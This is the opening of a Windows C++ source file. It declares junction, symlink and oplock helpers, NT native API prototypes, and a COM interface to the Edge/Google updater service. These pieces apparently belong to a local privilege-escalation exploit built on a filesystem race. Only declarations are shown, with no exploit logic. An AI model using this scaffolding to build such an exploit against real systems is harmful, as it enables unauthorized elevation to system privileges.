#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <sddl.h>
#include "FileOplock.h"
#include <combaseapi.h>
#include "resource.h"
#pragma warning(disable:4996)
#pragma comment(lib,"Rpcrt4.lib")
#pragma comment(lib,"Advapi32.lib")
BOOL CreateJunction(HANDLE dir, LPCWSTR target);
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target);
BOOL DeleteJunction(HANDLE hDir);
BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target);
LPWSTR BuildPath(LPCWSTR path);
BOOL Move(HANDLE hFile);
void cb0();
void load();
HANDLE hFile2;
WCHAR path[512] = { 0x0 };
HANDLE hFile, hDir;


struct __declspec(uuid("A6B716CB-028B-404D-B72C-50E153DD68DA")) CLSID_MSEdge_Object;
class __declspec(uuid("79e0c401-b7bc-4de5-8104-71350f3a9b67")) IGoogleUpdate : IUnknown {
public:


    HRESULT CheckForUpdate(const WCHAR* guid, VOID* observer);
    HRESULT Update(const WCHAR* guid, VOID* observer);

};

typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG  Flags;
            WCHAR  PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR  PathBuffer[1];
        } MountPointReparseBuffer;
        struct {
            UCHAR DataBuffer[1];
        } GenericReparseBuffer;
    } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;
typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;
#define STATUS_MORE_ENTRIES 0x00000105
#define STATUS_NO_MORE_ENTRIES 0x8000001A
#define IO_REPARSE_TAG_MOUNT_POINT              (0xA0000003L)

typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK   IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
typedef NTSYSAPI VOID(NTAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtOpenDirectoryObject)(OUT PHANDLE DirectoryHandle, IN ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtQueryDirectoryObject)(_In_      HANDLE  DirectoryHandle, _Out_opt_ PVOID   Buffer, _In_ ULONG Length, _In_ BOOLEAN ReturnSingleEntry, _In_  BOOLEAN RestartScan, _Inout_   PULONG  Context, _Out_opt_ PULONG  ReturnLength);
typedef NTSYSCALLAPI NTSTATUS(NTAPI* _NtSetInformationFile)(
    HANDLE                 FileHandle,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    ULONG FileInformationClass
    );

_RtlInitUnicodeString pRtlInitUnicodeString;
_NtCreateFile pNtCreateFile;
_NtSetInformationFile pNtSetInformationFile;

